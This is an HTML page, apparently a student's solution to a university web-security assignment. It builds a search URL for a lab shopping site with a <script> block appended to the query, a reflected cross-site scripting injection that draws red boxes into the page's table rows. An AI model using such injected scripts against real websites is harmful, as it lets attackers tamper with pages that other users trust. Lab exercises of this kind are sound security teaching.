<!DOCTYPE html>
<html>
  <head>
    <meta charset="UTF-8" />
    <title>Clickjacking</title>
  </head>

  <script type="text/javascript">
   function SOP(){


	var searchQuery = document.getElementById("q").value;
	
	console.log("search query is "+ searchQuery);

	//add a bunch of js code to the end of this url
	var script = `console.log("before");
	document.addEventListener('DOMContentLoaded',(event) => {
		var tds = document.querySelectorAll("tr");
		tds.forEach(function(td,index){
			console.log(index);
			if(index !== 0){

				var newDiv = document.createElement("div");
				newDiv.id = index;
				newDiv.style.width="20px";
				newDiv.style.height="20px";
				newDiv.style.border="solid";
				newDiv.style.color="red";
				td.lastElementChild.appendChild(newDiv);
			}
		});
		
		console.log(tds);
		console.log("after");
	})

	
	`
	
	var url = "http://www.gtshop.com/products/lookup?q=" + searchQuery + '<script>' + script + '<\/script>'

	window.location.href = url
	return false

    }

  </script>


  <body>
    <!-- DO NOT change the form id -->

    <form id="clickjack-form" onsubmit="return SOP()" >
    <!-- !!! DO NOT MODIFY ANYTHING BELOW THIS COMMENT !!! -->
      <h1>Georgia Tech Shopping</h1>
      <input type="text" name="q" id="q" />
      <input type="submit" id="lucky" value="I'm Feeling Lucky" />
    </form>
    <!-- !!! DO NOT MODIFY ANYTHING ABOVE THIS COMMENT !!! -->
  </body>
</html>
